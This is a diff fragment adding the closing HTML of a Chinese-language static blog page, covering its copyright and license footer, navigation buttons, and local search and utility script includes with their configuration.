+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
